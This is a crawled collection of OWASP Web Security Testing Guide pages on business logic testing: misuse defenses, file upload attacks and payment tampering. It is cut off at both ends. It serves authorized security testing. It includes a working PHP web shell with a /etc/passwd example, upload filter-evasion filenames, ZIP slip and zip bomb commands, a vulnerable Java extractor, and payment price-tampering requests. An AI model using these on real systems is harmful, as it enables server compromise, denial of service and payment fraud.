prevent attackers from circumventing/skipping/or repeating any steps/processes in the workflow. Test for workflow vulnerabilities involves developing business logic abuse/misuse cases with the goal of successfully completing the business process while not completing the correct steps in the correct order.\n\n## References\n\n- [OWASP Abuse Case Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Abuse_Case_Cheat_Sheet.html)\n- [CWE-840: Business Logic Errors](https://cwe.mitre.org/data/definitions/840.html)\n", "timestamp": "2025-10-24T11:39:56.837718"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/07-Test_Defenses_Against_Application_Misuse.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/07-Test_Defenses_Against_Application_Misuse.md", "content": "# Test Defenses Against Application Misuse\n\n|ID          |\n|------------|\n|WSTG-BUSL-07|\n\n## Summary\n\nThe misuse and invalid use of valid functionality can identify attacks attempting to enumerate the web application, identify weaknesses, and exploit vulnerabilities. Tests should be undertaken to determine whether there are application-layer defensive mechanisms in place to protect the application.\n\nThe lack of active defenses allows an attacker to hunt for vulnerabilities without any recourse. The application's owner will thus not know their application is under attack.\n\n### Example\n\nAn authenticated user undertakes the following (unlikely) sequence of actions:\n\n1. Attempt to access a file ID their roles is not permitted to download\n2. Substitutes a single tick `'` instead of the file ID number\n3. Alters a GET request to a POST\n4. Adds an extra parameter\n5. Duplicates a parameter name/value pair\n\nThe application is monitoring for misuse and responds after the 5th event with extremely high confidence the user is an attacker. For example the application:\n\n- Disables critical functionality\n- Enables additional authentication steps to the remaining functionality\n- Adds time-delays into every request-response cycle\n- Begins to record additional data about the user's interactions (e.g. sanitized HTTP request headers, bodies and response bodies)\n\nIf the application does not respond in any way and the attacker can continue to abuse functionality and submit clearly malicious content at the application, the application has failed this test case. In practice the discrete example actions in the example above are unlikely to occur like that. It is much more probable that a fuzzing tool is used to identify weaknesses in each parameter in turn. This is what a security tester will have undertaken too.\n\n## Test Objectives\n\n- Generate notes from all tests conducted against the system.\n- Review which tests had a different functionality based on aggressive input.\n- Understand the defenses in place and verify if they are enough to protect the system against bypassing techniques.\n\n## How to Test\n\nThis test is unusual in that the result can be drawn from all the other tests performed against the web application. While performing all the other tests, take note of measures that might indicate the application has in-built self-defense:\n\n- Changed responses\n- Blocked requests\n- Actions that log a user out or lock their account\n\nThese may only be localized. Common localized (per function) defenses are:\n\n- Rejecting input containing certain characters\n- Locking out an account temporarily after a number of authentication failures\n\nLocalized security controls are not sufficient. There are often no defenses against general mis-use such as:\n\n- Forced browsing\n- Bypassing presentation layer input validation\n- Multiple access control errors\n- Additional, duplicated or missing parameter names\n- Multiple input validation or business logic verification failures with values that cannot be the result of user mistakes or typos\n- Structured data (e.g. JSON, XML) of an invalid format is received\n- Blatant cross-site scripting or SQL injection payloads are received\n- Utilizing the application faster than would be possible without automation tools\n- Change in continental geo-location of a user\n- Change of user agent\n- Accessing a multi-stage business process in the wrong order\n- Large number of, or high rate of use of, application-specific functionality (e.g. voucher code submission, failed credit card payments, file uploads, file downloads, log outs, etc).\n\nThese defenses work best in authenticated parts of the application, although rate of creation of new accounts or accessing content (e.g. to scrape information) can be of use in public areas.\n\nNot all the above need to be monitored by the application, but there is a problem if none of them are. By testing the web application, doing the above type of actions, was any response taken against the tester? If not, the tester should report that the application appears to have no application-wide active defenses against misuse. Note it is sometimes possible that all responses to attack detection are silent to the user (e.g. logging changes, increased monitoring, alerts to administrators and and request proxying), so confidence in this finding cannot be guaranteed. In practice, very few applications (or related infrastructure such as a web application firewall) are detecting these types of misuse.\n\n## Related Test Cases\n\nAll other test cases are relevant.\n\n## Remediation\n\nApplications should implement active defenses to fend off attackers and abusers.\n\n## References\n\n- [Software Assurance](https://www.cisa.gov/uscert/sites/default/files/publications/infosheet_SoftwareAssurance.pdf), US Department Homeland Security\n- [IR 7684](https://csrc.nist.gov/publications/detail/nistir/7864/final) Common Misuse Scoring System (CMSS), NIST\n- [Common Attack Pattern Enumeration and Classification](https://capec.mitre.org/) (CAPEC), The Mitre Corporation\n- [OWASP AppSensor Project](https://owasp.org/www-project-appsensor/)\n- Watson C, Coates M, Melton J and Groves G, [Creating Attack-Aware Software Applications with Real-Time Defenses](https://pdfs.semanticscholar.org/0236/5631792fa6c953e82cadb0e7268be35df905.pdf), CrossTalk The Journal of Defense Software Engineering, Vol. 24, No. 5, Sep/Oct 2011\n", "timestamp": "2025-10-24T11:39:56.899440"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types.md", "content": "# Test Upload of Unexpected File Types\n\n|ID          |\n|------------|\n|WSTG-BUSL-08|\n\n## Summary\n\nMany applications' business processes allow for the upload and manipulation of data that is submitted via files. But the business process must check the files and only allow certain \"approved\" file types. Deciding what files are \"approved\" is determined by the business logic and is application/system specific. The risk is that by allowing users to upload files, attackers may submit an unexpected file type that could be executed and adversely impact the application or system through attacks that may deface the site, perform remote commands, browse the system files, browse the local resources, attack other servers, or exploit the local vulnerabilities, just to name a few.\n\nVulnerabilities related to the upload of unexpected file types is unique in that the upload should quickly reject a file if it does not have a specific extension. Additionally, this is different from uploading malicious files in that in most cases an incorrect file format may not by it self be inherently \"malicious\" but may be detrimental to the saved data. For example if an application accepts Windows Excel files, if a similar database file is uploaded it may be read but data extracted may be moved to incorrect locations.\n\nThe application may be expecting only certain file types to be uploaded for processing, such as `.csv` or `.txt` files. The application may not validate the uploaded file by extension (for low assurance file validation) or content (high assurance file validation). This may result in unexpected system or database results within the application/system or give attackers additional methods to exploit the application/system.\n\n### Example\n\nSuppose a picture sharing application allows users to upload a `.gif` or `.jpg` graphic file to the site. What if an attacker is able to upload an HTML file with a `<script>` tag in it or PHP file? The system may move the file from a temporary location to the final location where the PHP code can now be executed against the application or system.\n\n## Test Objectives\n\n- Review the project documentation for file types that are rejected by the system.\n- Verify that the unwelcomed file types are rejected and handled safely.\n- Verify that file batch uploads are secure and do not allow any bypass against the set security measures.\n\n## How to Test\n\n### Specific Testing Method\n\n- Study the applications logical requirements.\n- Prepare a library of files that are \"not approved\" for upload that may contain files such as: jsp, exe, or HTML files containing script.\n- In the application navigate to the file submission or upload mechanism.\n- Submit the \"not approved\" file for upload and verify that they are properly prevented from uploading\n- Check if the site only does file type checks in client-side JavaScript\n- Check if the site only checks the file type by \"Content-Type\" in HTTP request.\n- Check if the site only checks the file type by the file extension.\n- Check if other uploaded files can be accessed directly by specified URL.\n- Check if the uploaded file can include code or script injection.\n- Check if there is any file path checking for uploaded files. Especially, hackers may compress files with specified path in ZIP so that the extracted files can be uploaded to intended path after uploading and unzipping.\n\n## Related Test Cases\n\n- [Test File Extensions Handling for Sensitive Information](../02-Configuration_and_Deployment_Management_Testing/03-Test_File_Extensions_Handling_for_Sensitive_Information.md)\n- [Test Upload of Malicious Files](09-Test_Upload_of_Malicious_Files.md)\n\n## Remediation\n\nApplications should be developed with mechanisms to only accept and manipulate \"acceptable\" files that the rest of the application functionality is ready to handle and expecting. Some specific examples include: deny lists or allow lists of file extensions, using \"Content-Type\" from the header, or using a file type recognizer, all to only allow specified file types into the system.\n\n## References\n\n- [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)\n- [File upload security best practices: Block a malicious file upload](https://www.computerweekly.com/answer/File-upload-security-best-practices-Block-a-malicious-file-upload)\n- [Stop people uploading malicious PHP files via forms](https://stackoverflow.com/questions/602539/stop-people-uploading-malicious-php-files-via-forms)\n- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)\n", "timestamp": "2025-10-24T11:39:56.964773"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files.md", "content": "# Test Upload of Malicious Files\n\n|ID          |\n|------------|\n|WSTG-BUSL-09|\n\n## Summary\n\nMany application’s business processes allow users to upload data to them. Although input validation is widely understood for text-based input fields, it is more complicated to implement when files are accepted. Although many sites implement simple restrictions based on a list of permitted (or blocked) extensions, this is not sufficient to prevent attackers from uploading legitimate file types that have malicious contents.\n\nVulnerabilities related to the uploading of malicious files is unique in that these \"malicious\" files can easily be rejected through including business logic that will scan files during the upload process and reject those perceived as malicious. Additionally, this is different from uploading unexpected files in that while the file type may be accepted the file may still be malicious to the system.\n\nFinally, \"malicious\" means different things to different systems, for example malicious files that may exploit SQL server vulnerabilities may not be considered as \"malicious\" in an environment using a NoSQL data store.\n\nThe application may allow the upload of malicious files that include exploits or shellcode without submitting them to malicious file scanning. Malicious files could be detected and stopped at various points of the application architecture such as: Intrusion Detection/Prevention System, application server anti-virus software or anti-virus scanning by application as files are uploaded (perhaps offloading the scanning using SCAP).\n\n### Example\n\nA common example of this vulnerability is an application such as a blog or forum that allows users to upload images and other media files. While these are considered safe, if an attacker is able to upload executable code (such as a PHP script), this could allow them to execute operating system commands, read and modify information in the filesystem, access the backend database and fully compromise the server.\n\n## Test Objectives\n\n- Identify the file upload functionality.\n- Review the project documentation to identify what file types are considered acceptable, and what types would be considered dangerous or malicious.\n    - If documentation is not available then consider what would be appropriate based on the purpose of the application.\n- Determine how the uploaded files are processed.\n- Obtain or create a set of malicious files for testing.\n- Try to upload the malicious files to the application and determine whether it is accepted and processed.\n\n## How to Test\n\n### Malicious File Types\n\nThe simplest checks that an application can do are to determine that only trusted types of files can be uploaded.\n\n#### Web Shells\n\nIf the server is configured to execute code, then it may be possible to obtain command execution on the server by uploading a file known as a web shell, which allows you to execute arbitrary code or operating system commands. In order for this attack to be successful, the file needs to be uploaded inside the webroot, and the server must be configured to execute the code.\n\nUploading this kind of shell onto an internet facing server is dangerous, because it allows anyone who knows (or guesses) the location of the shell to execute code on the server. A number of techniques can be used to protect the shell from unauthorised access, such as:\n\n- Uploading the shell with a randomly generated name.\n- Password protecting the shell.\n- Implementing IP based restrictions on the shell.\n\n**Remember to remove the shell when you are done.**\n\nThe example below shows a simple PHP based shell, that executes operating system commands passed to it in a GET parameter, and can only be accessed from a specific IP address:\n\n```php\n<?php\n    if ($_SERVER['REMOTE_HOST'] === \"FIXME\") { // Set your IP address here\n        if(isset($_REQUEST['cmd'])){\n            $cmd = ($_REQUEST['cmd']);\n            echo \"<pre>\\n\";\n            system($cmd);\n            echo \"</pre>\";\n        }\n    }\n?>\n```\n\nOnce the shell is uploaded (with a random name), you can execute operating system commands by passing them in the `cmd` GET parameter:\n\n`https://example.org/7sna8uuorvcx3x4fx.php?cmd=cat+/etc/passwd`\n\n#### Filter Evasion\n\nThe first step is to determine what the filters are allowing or blocking, and where they are implemented. If the restrictions are performed on the client-side using JavaScript, then they can be trivially bypassed with an intercepting proxy.\n\nIf the filtering is performed on the server-side, then various techniques can be attempted to bypass it, including:\n\n- Change the value of `Content-Type` as `image/jpeg` in HTTP request.\n- Change the extensions to a less common extension, such as `file.php5`, `file.shtml`, `file.asa`, `file.jsp`, `file.jspx`, `file.aspx`, `file.asp`, `file.phtml`, `file.cshtml`\n- Use double extensions such as `file.jpg.php` or `file.png.php`. For this to work properly, you must first understand how the web server handles files with multiple extensions. For instance, in certain scenario, the web server may only check if `.jpg` or `.png` is part of the file's extension which may allow attackers to bypass file extension filter.\n- Change the [file signature](https://en.wikipedia.org/wiki/List_of_file_signatures) or magic byte of the uploaded file.\n- Change the capitalisation of the extension, such as `file.PhP` or `file.AspX`\n- If the request includes multiple filenames, change them to different values.\n- Using special trailing characters such as spaces, dots or null characters such as `file.asp...`, `file.php;jpg`, `file.asp%00.jpg`, `1.jpg%00.php`\n- In badly configured versions of Nginx, uploading a file as `test.jpg/x.php` may allow it to be executed as `x.php`.\n- Upload an `.htaccess` file with the following content: `AddType application/x-httpd-php .png`. This will cause the Apache server to execute `.png` images as if they were `.php` resources.\n\n**Note that in some situations, you may need to combine the different filter evasion techniques discussed above in order to successfully bypass server-side filters.**\n\n### Malicious File Contents\n\nOnce the file type has been validated, it is important to also ensure that the contents of the file are safe. This is significantly harder to do, as the steps required will vary depending on the types of file that are permitted.\n\n#### Malware\n\nApplications should generally scan uploaded files with anti-malware software to ensure that they do not contain anything malicious. The easiest way to test for this is using the [EICAR test file](https://www.eicar.org/download-anti-malware-testfile/), which is an safe file that is flagged as malicious by all anti-malware software.\n\nDepending on the type of application, it may be necessary to test for other dangerous file types, such as Office documents containing malicious macros. Tools such as the [Metasploit Framework](https://github.com/rapid7/metasploit-framework) and the [Social Engineer Toolkit (SET)](https://github.com/trustedsec/social-engineer-toolkit) can be used to generate malicious files for various formats.\n\nWhen this file is uploaded, it should be detected and quarantined or deleted by the application. Depending on how the application processes the file, it may not be obvious whether this has taken place.\n\n#### Archive Directory Traversal\n\nIf the application extracts archives (such as ZIP files), then it may be possible to write to unintended locations using directory traversal. This can be exploited by uploading a malicious ZIP file that contains paths that traverse the file system using sequences such as `..\\..\\..\\..\\shell.php`. This technique is discussed further in the [snyk advisory](https://snyk.io/research/zip-slip-vulnerability).\n\nA test against Archive Directory Traversal should include two parts:\n\n1. A malicious archive that breaks out of the target directory when extracted. This malicious archive should contain two files: a `base` file, extracted into the target directory, and a `traversed` file that attempts to navigate up the directory tree to hit the root folder - adding a file into the `tmp` directory. A malicious path will contain many levels of `../` (*i.e.* `../../../../../../../../tmp/traversed`) to stand a better chance of reaching the root directory. Once the attack is successful, the tester can find `/tmp/traversed` to be created on the webserver through the ZIP slip attack.\n2. Logic that extracts compressed files either using custom code or a library. Archive Directory Traversal vulnerabilities exist when the extraction functionality doesn’t validate file paths in the archive. The example below shows a vulnerable implementation in Java:\n\n```java\nEnumeration<ZipEntry> entries =​ ​zip​.g​etEntries();\n\nwhile(entries​.h​asMoreElements()){\n    ZipEntry e ​= ​entries.nextElement();\n    File f = new File(destinationDir, e.getName());\n    InputStream input = zip​.g​etInputStream(e);\n    IOUtils​.c​opy(input, write(f));\n}\n```\n\nFollow the steps below to create a ZIP file that can abuse the vulnerable code above once its uploaded to the web server:\n\n```bash\n# Open a new terminal and create a tree structure\n# (more directory levels might be required based on the system being targeted)\nmkdir -p a/b/c\n# Create a base file\necho 'base' > a/b/c/base\n# Create a traversed file\necho 'traversed' > traversed\n# You can double check the tree structure using `tree` at this stage\n# Navigate to a/b/c root directory\ncd a/b/c\n# Compress the files\nzip test.zip base ../../../traversed\n# Verify compressed files content\nunzip -l test.zip\n```\n\n#### ZIP Bombs\n\nA [ZIP bomb](https://en.wikipedia.org/wiki/zip_bomb) (more generally known as a decompression bomb) is an archive file that contains a large volume of data. It's intended to cause a denial of service by exhausting the disk space or memory of the target system that tries to extract the archive. Note that although the ZIP format is the most used example for this, other formats are also affected, including gzip (which is frequently used to compress data in transit).\n\nAt its simplest level, a ZIP bomb can be created by compressing a large file consisting of a single character. The example below shows how to create a 1MB file that will decompress to 1GB:\n\n```bash\ndd if=/dev/zero bs=1M count=1024 | zip -9 > bomb.zip\n```\n\nThere are a number of methods that can be used to achieve much higher compression ratios, including multiple levels of compression, [abusing the ZIP format](https://www.bamsoftware.com/hacks/zipbomb/) and [quines](https://research.swtch.com/zip) (which are archives that contain a copy of themselves, causing infinite recursion).\n\nA successful ZIP bomb attack will result in a denial of service, and can also lead to increased costs if an auto-scaling cloud platform is used. **Do not carry out this kind of attack unless you have considered these risks and have written approval to do so.**\n\n#### XML Files\n\nXML files have a number of potential vulnerabilities such as XML eXternal Entities (XXE) and denial of service attacks such as the [billion laughs attack](https://en.wikipedia.org/wiki/Billion_laughs_attack).\n\nThese are discussed further in the [Testing for XML Injection](../07-Input_Validation_Testing/07-Testing_for_XML_Injection.md) guide.\n\n#### Other File Formats\n\nMany other file formats also have specific security concerns that need to be taken into account, such as:\n\n- Image files must be checked for maximum pixel/frame size.\n- CSV files may allow [CSV injection attacks](https://owasp.org/www-community/attacks/CSV_Injection).\n- Office files may contain malicious macros or PowerShell code.\n- PDFs may contain malicious JavaScript.\n\nThe permitted file formats should be carefully reviewed for potentially dangerous functionality, and where possible attempts should be made to exploit this during testing.\n\n### Source Code Review\n\nWhen there is file upload feature supported, the following API/methods are common to be found in the source code.\n\n- Java: `new file`, `import`, `upload`, `getFileName`, `Download`, `getOutputString`\n- C/C++: `open`, `fopen`\n- PHP: `move_uploaded_file()`, `Readfile`, `file_put_contents()`, `file()`, `parse_ini_file()`, `copy()`, `fopen()`, `include()`, `require()`\n\n## Related Test Cases\n\n- [Test File Extensions Handling for Sensitive Information](../02-Configuration_and_Deployment_Management_Testing/03-Test_File_Extensions_Handling_for_Sensitive_Information.md)\n- [Testing for XML Injection](../07-Input_Validation_Testing/07-Testing_for_XML_Injection.md)\n- [Test Upload of Unexpected File Types](08-Test_Upload_of_Unexpected_File_Types.md)\n\n## Remediation\n\nFully protecting against malicious file upload can be complex, and the exact steps required will vary depending on the types of files that are uploaded, and how the files are processed or parsed on the server. This is discussed more fully in the [File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html).\n\n## Tools\n\n- Metasploit's payload generation functionality\n- Intercepting proxy\n\n## References\n\n- [OWASP - File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)\n- [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)\n- [Why File Upload Forms are a Major Security Threat](https://www.acunetix.com/websitesecurity/upload-forms-threat/)\n- [8 Basic Rules to Implement Secure File Uploads](https://software-security.sans.org/blog/2009/12/28/8-basic-rules-to-implement-secure-file-uploads)\n- [Stop people uploading malicious PHP files via forms](https://stackoverflow.com/questions/602539/stop-people-uploading-malicious-php-files-via-forms)\n- [How to Tell if a File is Malicious](https://web.archive.org/web/20210710090809/https://www.techsupportalert.com/content/how-tell-if-file-malicious.htm)\n- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)\n- [Implementing Secure File Upload](https://infosecauditor.wordpress.com/tag/malicious-file-upload/)\n- [Metasploit Generating Payloads](https://www.offensive-security.com/metasploit-unleashed/Generating_Payloads)\n- [List of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)\n", "timestamp": "2025-10-24T11:39:57.083740"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/10-Test-Payment-Functionality.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/10-Test-Payment-Functionality.md", "content": "# Test Payment Functionality\n\n|ID          |\n|------------|\n|WSTG-BUSL-10|\n\n## Summary\n\nMany applications implement payment functionality, including e-commerce sites, subscriptions, charities, donation sites and currency exchanges. The security of this functionality is critical, as vulnerabilities could allow attackers to steal from the organization, make fraudulent purchases, or even to steal payment card details from other users. These issue could result in not only reputational damage to the organization, but also significant financial losses, both from direct losses and fines from industry regulators.\n\n## Test Objectives\n\n- Determine whether the business logic for the e-commerce functionality is robust.\n- Understand how the payment functionality works.\n- Determine whether the payment functionality is secure.\n\n## How to Test\n\n### Payment Gateway Integration Methods\n\nThere are several different ways that applications can integrate payment functionality, and the testing approach will vary depending on which one is used. The most common methods are:\n\n- Redirecting the user to a third-party payment gateway.\n- Loading a third-party payment gateway in an IFRAME on the application.\n- Having a HTML form that makes a cross-domain POST request to a third-party payment gateway.\n- Accepting the card details directly, and then making a POST from the application backend to the payment gateway's API.\n\n### PCI DSS\n\nThe Payment Card Industry Data Security Standard (PCI DSS) is a standard that organizations are required to follow in order process debit and card payments (although it's important to note that it is not a law). A full discussion of this standard is outside of the scope of this guide (and of most penetration tests) - but it's useful for testers to understand a few key points.\n\nThe most common misconception about PCI DSS is that it only applies to systems that store cardholder data (i.e, debit or credit card details). This is incorrect: it applies to any system that \"stores, processes or transmits\" this information. Exactly which requirements need to be followed depends on how which of the payment gateway integration methods are used. The [Visa Processing E-Commerce Payments guidance](https://www.visa.co.uk/dam/VCOM/regional/ve/unitedkingdom/PDF/risk/processing-e-commerce-payments-guide-73-17337.pdf) provides further details on this, but as a brief summary:\n\n| Integration Method | Self Assessment Questionnaire (SAQ) |\n|--------------------|-------------------------------------|\n| Redirect | [SAQ A](https://www.pcisecuritystandards.org/documents/PCI-DSS-v3_2_1-SAQ-A.pdf) |\n| IFRAME | [SAQ A](https://www.pcisecuritystandards.org/documents/PCI-DSS-v3_2_1-SAQ-A.pdf) |\n| Cross-domain POST | [SAQ A-EP](https://www.pcisecuritystandards.org/documents/PCI-DSS-v3_2-SAQ-A_EP-rev1_1.pdf) |\n| Backend API | [SAQ D](https://www.pcisecuritystandards.org/documents/PCI-DSS-v3_2_1-SAQ-D_Merchant.pdf) |\n\nIn addition to the differences in the attack surface and risk profile of each approach, there is also a significant difference in the number of requirements between SAQ A (22 requirements) and SAQ D (329 requirements) that the organization needs to meet. As such, it's worth highlighting applications that are not using an redirect or IFRAME, as they represent increased technical and compliance risks.\n\n### Quantity Tampering\n\nMost e-commerce sites allow users to add items to a basket before they start the checkout process. This basket should keep track of which items that have been added, and the quantity of each item. The quantity should normally be a positive integer, but if the site does not properly validate this then it may be possible to specify a decimal quantity of an item (such as `0.1`), or a negative quantity (such as `-1`). Depending on the backend processing, adding negative quantities of an item may result in a negative value, reducing the overall cost of the basket.\n\nThere are usually multiple ways to modify the contents of the basket that should be tested, such as:\n\n- Adding a negative quantity of an item.\n- Repeatedly removing items until the quantity is negative.\n- Updating the quantity to a negative value.\n\nSome sites may also provide a drop-down menu of valid quantities (such as items that must be bought in packs of 10), and it may be possible to tamper these requests to add other quantities of items.\n\nIf the full basket details are passed to the payment gateway (rather than simply passing a total value), it may also be possible to tamper the values at that stage.\n\nFinally, if the application is vulnerable to [HTTP parameter pollution](../07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution.md) then it may be possible to cause unexpected behavior by passing a parameter multiple times, such as:\n\n```http\nPOST /api/basket/add\nHost: example.org\n\nitem_id=1&quantity=5&quantity=4\n```\n\n### Price Tampering\n\n#### On the Application\n\nWhen adding an item to the basket, the application should only include the item and a quantity, such as the example request below:\n\n```http\nPOST /api/basket/add HTTP/1.1\nHost: example.org\n\nitem_id=1&quantity=5\n```\n\nHowever, in some cases the application may also include the price, meaning that it may be possible to tamper it:\n\n```http\nPOST /api/basket/add HTTP/1.1\nHost: example.org\n\nitem_id=1&quantity=5&price=2.00\n```\n\nDifferent types of items may have different validation rules, so each type needs to be separately tested. Some applications also allow users to add an optional donation to charity as part of their purchase, and this donation can usually be an arbitrary amount. If this amount is not validated, it may be possible to add a negative donation amount, which would then reduce the total value of the basket.\n\n#### On the Payment Gateway\n\nIf the checkout process is performed on a third-party payment gateway, then it may be possible to tamper with the prices between the application and the gateway.\n\nThe transfer to the gateway may be performed using a cross-domain POST to the gateway, as shown in the HTML example below.\n\n> Note: The card details are not included in this request - the user will be prompted for them on the payment gateway:\n\n```html\n<form action=\"https://example.org/process_payment\" method=\"POST\">\n    <input type=\"hidden\" id=\"merchant_id\" value=\"123\" />\n    <input type=\"hidden\" id=\"basket_id\" value=\"456\" />\n    <input type=\"hidden\" id=\"item_id\" value=\"1\" />\n    <input type=\"hidden\" id=\"item_quantity\" value=\"5\" />\n    <input type=\"hidden\" id=\"item_total\" value=\"20.00\" />\n    <input type=\"hidden\" id=\"shipping_total\" value=\"2.00\" />\n    <input type=\"hidden\" id=\"basket_total\" value=\"22.00\" />\n    <input type=\"hidden\" id=\"currency\" value=\"GBP\" />\n    <input type=\"submit\" id=\"submit\" value=\"submit\" />\n</form>\n```\n\nBy modifying the HTML form or intercepting the POST request, it may be possible to modify the prices of items, and to effectively purchase them for less. Note that many payment gateways will reject a transaction with a value of zero, so a total of 0.01 is more likely to succeed. However, some payment gateways may accept negative values (used to process refunds). Where there are multiple values (such as item prices, a shipping cost, and the total basket cost), all of these should be tested.\n\nIf the payment gateway uses an IFRAME instead, it may be possible to perform a similar type of attack by modifying the IFRAME URL:\n\n```html\n<iframe src=\"https://example.org/payment_iframe?merchant_id=123&basket_total=22.00\" />\n```\n\n> Note: Payment gateways are usually run by a third-parties, and as such may not be included in the scope of testing. This means that while price tampering may be acceptable, other types of attacks (such as SQL injection) should not be performed without explicit written approval).\n\n#### Encrypted Transaction Details\n\nIn order to prevent the transaction being tampered with, some payment gateways will encrypt the details of the request that is made to them. For example, [PayPal](https://developer.paypal.com/api/nvp-soap/paypal-payments-standard/integration-guide/encryptedwebpayments/#link-usingewptoprotectmanuallycreatedpaymentbuttons) does this using public key cryptography.\n\nThe first thing to try is making an unencrypted request, as some payment gateways allow insecure transactions unless they have been specifically configured to reject them.\n\nIf this doesn't work, then you need to find the public key that is used to encrypt the transaction details, which could be exposed in a backup of the application, or if you can find a directory traversal vulnerability.\n\nAlternatively, it's possible that the application re-uses the same public/private key pair for the payment gateway and its digital certificate. You can obtain the public key from the server with the following command:\n\n```bash\necho -e '\\0' | openssl s_client -connect example.org:443 2>/dev/null | openssl x509 -pubkey -noout\n```\n\nOnce you have this key, you can then try and create an encrypted request (based on the payment gateway's documentation), and submit it to the gateway to see if it's accepted.\n\n#### Secure Hashes\n\nOther payment gateways use a secure hash (or a HMAC) of the transaction details to prevent tampering. The exact details of how this is done will vary between providers (for example, [Adyen](https://docs.adyen.com/online-payments/classic-integrations/hosted-payment-pages/hmac-signature-calculation) uses HMAC-SHA256), but it will normally include the details of the transaction and a secret value. For example, a hash may be calculated as:\n\n```php\n$secure_hash = md5($merchant_id . $transaction_id . $items . $total_value . $secret)\n```\n\nThis value is then added to the POST request that is sent to the payment gateway, and verified to ensure that the transaction hasn't been tampered with.\n\nThe first thing to try is removing the secure hash, as some payment gateways allow insecure transactions unless a specific configuration option has been set.\n\nThe POST request should contain all of the values required to calculate this hash, other than the secret key. This means that if you know how the hash is calculated (which should be included in the payment gateway's documentation), then you can attempt to brute-force the secret. Alternatively, if the site is running an off-the-shelf application, there may be a default secret in the configuration files or source code. Finally, if you can find a backup of the site, or otherwise gain access to the configuration files, you may be able to find the secret there.\n\nIf you can obtain this secret, you can then tamper the transaction details, and then generate your own secure hash which will be accepted by the payment gateway.\n\n#### Currency Tampering\n\nIf it's not possible to tamper with the actual prices, it may be possible to change the currency that is used, especially where applications support multiple currencies. For example, the application may validate that the price is 10, but if you can change the currency so that you pay 10 USD rather than 10 GBP, this would allow you to purchase items more cheaply.\n\n#### Time Delayed Requests\n\nIf the value of items on the site changes over time (for example on a currency exchange), then it may be possible to buy or sell at an old price by intercepting requests using a local proxy and delaying them. In order for this to be exploitable, the price would need to either be included in the request, or linked to something in the request (such as session or transaction ID). The example below shows how this could potentially be exploited on a application that allows users to buy and sell gold:\n\n- View the current price of gold on the site.\n- Initiate a buy request for 1oz of gold.\n- Intercept and freeze the request.\n- Wait one minutes to check the price of gold again:\n    - If it increases, allow the transaction to complete, and buy the gold for less than it's current value.\n    - If it decreases, drop the request request.\n\nIf the site allows the user to make payments using cryptocurrencies (which are usually far more volatile), it may be possible to exploit this by obtaining a fixed price in that cryptocurrency, and then waiting to see if the value rises or falls compared to the main currency used by the site.\n\n### Discount Codes\n\nIf the application supports discount codes, then there are various checks that should be carried out:\n\n- Are the codes easily guessable (TEST, TEST10, SORRY, SORRY10, company name, etc)?\n    - If a code has a number in, can more codes be found by increasing the number?\n- Is there any brute-force protection?\n- Can multiple discount codes be applied at once?\n- Can discount codes be applied multiple times?\n- Can you [inject wildcard characters](../07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#sql-wildcard-injection) such as `%` or `*`?\n- Are discount codes exposed in the HTML source or hidden `<input>` fields anywhere on the application?\n\nIn addition to these, the usual vulnerabilities such as SQL injection should be tested for.\n\n### Breaking Payment Flows\n\nIf the checkout or payment process on an application involves multiple stages (such as adding items to a basket, entering discount codes, entering shipping details, and entering billing information), then it may be possible to cause unintended behavior by performing these steps outside of the expected sequence. For example, you could try:\n\n- Modifying the shipping address after the billing details have been entered to reduce shipping costs.\n- Removing items after entering shipping details, to avoid a minimum basket value.\n- Modifying the contents of the basket after applying a discount code.\n- Modifying the contents of a basket after completing the checkout process.\n\nIt may also be possible to skip the entire payment process for the transaction. For example, if the application redirects to a third-party payment gateway, the payment flow may be:\n\n- The user enters details on the application.\n- The user is redirected to the third-party payment gateway.\n- The user enters their card details.\n    - If the payment is successful, they are redirected to `success.php` on the application.\n    - If the payment is unsuccessful, they are redirected to `failure.php` on the application\n- The application updates its order database, and processes the order if it was successful.\n\nDepending on whether the application actually validates that the payment on the gateway was successful, it may be possible to force-browse to the `success.php` page (possibly including a transaction ID if one is required), which would cause the site to process the order as though the payment was successful. Additionally, it may be possible to make repeated requests to the `success.php` page to cause an order to be processed multiple times.\n\n### Exploiting Transaction Processing Fees\n\nMerchants normally have to pay fees for every transaction processed, which are typically made up of a small fixed fee, and a percentage of the total value. This means that receiving very small payments (such as $0.01) may result in the merchant actually losing money, as the transaction processing fees are greater than the total value of the transaction.\n\nThis issue is rarely exploitable on e-commerce sites, as the price of the cheapest item is usually high enough to prevent it. However, if the site allows customers to make payments with arbitrary amounts (such as donations), check that it enforces a sensible minimum value.\n\n### Test Payment Cards\n\nMost payment gateways have a set of defined test card details, which can be used by developers during testing and debugging. These should only be usable on development or sandbox versions of the gateways, but may be accepted on live sites if they have been misconfigured.\n\nExamples of these test details for various payment gateways are listed below:\n\n- [Adyen - Test Card 